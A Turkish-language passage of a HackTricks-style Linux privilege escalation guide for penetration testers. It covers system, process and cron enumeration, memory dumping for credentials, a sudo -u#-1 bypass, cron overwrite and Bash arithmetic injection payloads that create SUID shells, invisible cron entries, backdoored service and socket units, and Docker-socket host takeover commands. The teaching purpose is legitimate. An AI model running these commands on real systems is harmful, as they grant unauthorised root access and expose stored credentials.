# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgisi

### OS bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Eğer `PATH` değişkenindeki herhangi bir klasörde **yazma izinlerine** sahipseniz bazı kütüphaneleri veya ikili dosyaları hijack edebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Çevresel değişkenlerde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve escalate privileges için kullanılabilecek bir exploit olup olmadığını araştırın.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Burada iyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits** bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O siteden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Çekirdek exploit'lerini aramanıza yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Her zaman **çekirdek sürümünü Google'da arayın**, belki çekirdek sürümünüz bazı kernel exploit'lerinde yazılıdır ve bu sayede bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Aşağıda görünen zayıf Sudo sürümlerine dayanır:
```bash
searchsploit sudo
```
sudo sürümünün vulnerable olup olmadığını bu grep ile kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu vuln'un nasıl sömürülebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları sıralayın

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Kontrol edin **nelerin bağlandığını ve bağlanmadığını**, nerede ve neden. Eğer bir şey bağlanmamışsa, onu bağlamayı deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını kontrol edin**. Bu, bazı kernel exploit'lerini kullanmanız gerekirse faydalıdır; genellikle bu exploit'leri kullanacağınız makinede (ya da benzer bir makinede) derlemeniz tavsiye edilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Güvenlik Açığı Olan Yazılımlar

Yüklü paketlerin ve servislerin **sürümlerini** kontrol edin. Belki eski bir Nagios sürümü vardır (örneğin) ve bu sürüm escalating privileges elde etmek için exploited edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makinaya SSH erişiminiz varsa, içinde yüklü olan güncel olmayan ve güvenlik açığı bulunan yazılımları kontrol etmek için **openVAS** kullanabilirsiniz.

> [!NOTE] > _Bu komutlar çoğunlukla işe yaramayacak çok fazla bilgi gösterecektir; bu nedenle yüklü yazılım sürümlerinin bilinen exploits'e karşı zafiyetli olup olmadığını kontrol eden OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## İşlemler

Hangi **işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa sahip** olup olmadığını kontrol edin (örneğin root tarafından çalıştırılan bir tomcat olabilir mi?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** prosesin komut satırındaki `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **processlerin binaries** üzerindeki ayrıcalıklarınızı kontrol edin, belki birinin üzerine yazabilirsiniz.

### Süreç izleme

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya belirli gereksinimler karşılandığında yürütülen zafiyetli süreçleri tespit etmek için çok faydalı olabilir.

### Süreç belleği

Bazı sunucu servisleri **kimlik bilgilerini belleğin içinde düz metin olarak kaydeder**.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root privileges** gerekir, bu nedenle bu genellikle zaten root olduğunuzda daha faydalıdır ve daha fazla kimlik bilgisi keşfetmek için kullanılır.\
Bununla birlikte, **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tüm süreçler debug edilebilir, aynı uid'ye sahip oldukları sürece. Bu ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE yeteneği gerektirir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile trace edilemez. Bir kez ayarlandığında, ptracing'i tekrar etkinleştirmek için yeniden başlatma gerekir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i alıp içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps, belleğin o işlemin sanal adres alanında nasıl haritalandığını gösterir**; ayrıca **her haritalanmış bölgenin izinlerini** gösterir. **mem** pseudo file **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve offsetlerini biliriz. Bu bilgiyi kullanarak **mem dosyasına seek yapar ve tüm okunabilir bölgeleri bir dosyaya dump ederiz**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış hâlidir. Edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve size ait işlemi dökebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator işlemi çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
İşlemi dump edebilir (bir process'in memory'sini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **bellekten düz metin kimlik bilgilerini** ve bazı **bilinen dosyalardan** çalar. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | Süreç Adı            |
| ------------------------------------------------- | -------------------- |
| GDM şifresi (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron jobs

Herhangi bir zamanlanmış job'un zafiyete açık olup olmadığını kontrol edin. Belki root tarafından yürütülen bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizine belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Örneğin, _/etc/crontab_ içinde PATH şu şekildedir: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_/home/user üzerinde "user" kullanıcısının yazma izinlerine sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı path'i ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Ardından, şu şekilde root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ile wildcard içeren bir script kullanımı (Wildcard Injection)

Bir script root tarafından çalıştırıldığında bir komut içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için suistimal edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun önünde ise örneğin** _**/some/path/\***_ **, zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Eğer bir root cron/parser güvenilmeyen log alanlarını okuyup bunları bir aritmetik bağlama gönderiyorsa, bir saldırgan cron çalıştığında root olarak yürütülecek bir command substitution $(...) enjekte edebilir.

- Neden çalışır: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, sonra word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), ardından kalan sayısal `0` aritmetik için kullanılır ve script hata vermeden devam eder.

- Tipik vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Sömürme: Parsed log'a attacker-controlled metin yazdırın, böylece sayısal gibi görünen alan bir command substitution içerir ve bir rakamla biter. Komutunuzun stdout'a yazmadığından emin olun (veya çıktıyı yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir **cron script'ini değiştirebiliyorsanız**, çok kolay bir şekilde bir shell alabilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminiz olan bir directory** kullanıyorsa, o folder'ı silip kontrolünüzdeki bir scripti sunan başka bir yere işaret eden bir **symlink folder oluşturmak** işe yarayabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron görevleri

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan işlemleri tespit edebilirsiniz. Belki bundan faydalanıp escalate privileges elde edebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izle**, **en az çalıştırılan komutlara göre sırala** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Yorumdan sonra **carriage return koyarak** (yeni satır karakteri olmadan) bir cronjob oluşturmak mümkündür ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamayacağını kontrol et; yazabiliyorsan, bunu **değiştirip** servisin **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unu **çalıştıracak** şekilde ayarlayabilirsin (belki makinenin yeniden başlatılmasını beklemen gerekir).\
Örneğin backdoor'unu .service dosyasına **`ExecStart=/tmp/script.sh`** yazarak oluştur.

### Yazılabilir servis binary'leri

Unutma: eğer **servisler tarafından çalıştırılan binary'lar üzerinde yazma iznine** sahipsen, bunları backdoor'lar için değiştirebilirsin; servisler yeniden yürütüldüğünde backdoor'lar çalıştırılacaktır.

### systemd PATH - Göreli Yollar

systemd tarafından kullanılan PATH'i şu komutla görebilirsin:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **yazabiliyorsanız**, **escalate privileges** yapabiliyor olabilirsiniz. Hizmet yapılandırma dosyalarında kullanılan **göreli yolları** aramanız gerekir, örneğin:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma hakkınız olan systemd PATH klasörünün içine, göreli yol binary'si ile aynı ada sahip bir **executable** oluşturun ve servis hassas eylemi (**Start**, **Stop**, **Reload**) çalıştırması istendiğinde, sizin **backdoor**'unuz çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle servisleri başlatıp durduramaz fakat `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Learn more about services with `man systemd.service`.**

## **Zamanlayıcılar**

**Zamanlayıcılar** (Timers) adı `**.timer**` ile biten systemd unit dosyalarıdır ve `**.service**` dosyalarını veya olayları kontrol eder. **Zamanlayıcılar**, takvim zaman etkinlikleri ve monotonic zaman etkinlikleri için yerleşik destek sundukları ve eşzamansız olarak çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timerlar

Eğer bir timer'ı değiştirebiliyorsanız, mevcut systemd.unit öğelerinden bazılarını (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şöyle açıklanıyor:

> Bu timer sona erdiğinde etkinleştirilecek bir unit. Argüman, soneki ".timer" olmayan bir unit adıdır. Belirtilmezse, bu değer timer unit ile aynı ada sahip, soneki hariç bir service'e varsayılandır. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adının soneki hariç aynı olması önerilir.

Bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Bir systemd unit (ör. `.service`) bulun ki **yazılabilir bir binary çalıştırıyor**
- **göreli bir yol çalıştıran** bir systemd unit bulun ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olun (o yürütülebilir dosyayı taklit etmek için)

**Learn more about timers with `man systemd.timer`.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Dikkat: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` üzerine ona bir symlink oluşturarak **etkinleştirilir**

## Sockets

Unix Domain Sockets (UDS) aynı veya farklı makinelerde client-server modellerinde **process communication** sağlar. AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası gibi değerler için standart Unix descriptor dosyalarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Learn more about sockets with `man systemd.socket`.** Bu dosya içinde yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır fakat özet olarak **nerede dinleneceğini belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve sadece bağlantı soketi ona geçirilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan service unit'ine geçirilir** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer, datagram soketleri ve FIFOs için göz ardı edilir; bu türlerde tek bir service unit koşulsuz olarak tüm gelen trafiği işler. **Defaults to false**. Performans nedenleriyle, yeni daemon'ları yalnızca `Accept=no` için uygun bir şekilde yazmak önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar dinleme **sockets**/FIFOs **oluşturulup** bağlanmadan önce veya sonra sırasıyla **çalıştırılır**. Komut satırının ilk token'ı mutlak bir dosya adı olmalıdır, ardından proses için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFOs **kapatılmadan** ve kaldırılmadan önce veya sonra **çalıştırılan** ek **komutlar**.
- `Service`: Gelen trafik üzerinde **etkinleştirilecek** olan **service** unit adını belirtir. Bu ayar yalnızca `Accept=no` olan soketler için izinlidir. Varsayılan olarak socket ile aynı ada sahip (suffix değiştirilmiş) service olur. Çoğu durumda bu seçeneği kullanmak gerekli değildir.

### Writable .socket files

Eğer bir **yazılabilir** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey **ekleyebilirsiniz** ve backdoor, socket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekir.**\
_Not that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_şimdi config `.socket` dosyalarından değil, Unix Sockets'ten bahsediyoruz_), o socket ile **iletişim kurabilir** ve belki bir zafiyetten faydalanabilirsiniz.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP isteklerini dinleyen bazı **sockets listening for HTTP** olabilir (_Bahsettiğim .socket files değil, unix sockets olarak davranan dosyalar_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de bazı güvenlik açıklarını **exploit** edebilirsiniz.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunan kritik bir dosyadır ve güvenli hale getirilmelidir. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e yazma erişimi sahibi olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceği ve Docker CLI kullanılabilir değilse alternatif yöntemlerin bir dökümü bulunmaktadır.

#### **Privilege Escalation with Docker CLI**

Eğer Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, ana makinenin dosya sistemine root düzeyinde erişime sahip bir container çalıştırmanızı sağlar.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI mevcut olmadığında, Docker socket hala Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **Docker Görüntülerini Listele:** Kullanılabilir görüntülerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Ana sistemin root dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Container'a Bağlan:** `socat` kullanarak container ile bir bağlantı kurun; bu, içinde komut çalıştırmanıza olanak sağlar.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, ana makinenin dosya sistemine root düzeyinde erişimle container içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

docker socket üzerinde yazma izniniz varsa çünkü **inside the group `docker`** grubunun içindesiniz [**ayrıca ayrıcalıkları yükseltmenin daha fazla yolu**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API bir portta dinliyorsa**](../../network-services-pentesting/2375-pentesting-docker.md#compromising), onu da ele geçirebilirsiniz.

Docker'dan çıkmak veya ayrıcalıkları yükseltmek için onu kötüye kullanmanın **daha fazla yolunu** şu bölümde inceleyin:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü bunu ayrıcalıkları yükseltmek için kötüye kullanma imkanınız olabilir:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü bunu ayrıcalıkları yükseltmek için kötüye kullanma imkanınız olabilir:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi dikkate alınarak tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; süreçler arasındaki veri alışverişini artıran temel IPC'yi destekler ve bu, **enhanced UNIX domain sockets**'ı andırır. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olur ve sistem bileşenleri arasında sorunsuz bir entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen çağrı sinyali, bir müzik çalarını sessize almayı tetikleyerek kullanıcı deneyimini iyileştirebilir. Ayrıca D-Bus, uzak nesne sistemini destekleyerek uygulamalar arasındaki servis taleplerini ve yöntem çağrılarını basitleştirir; geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

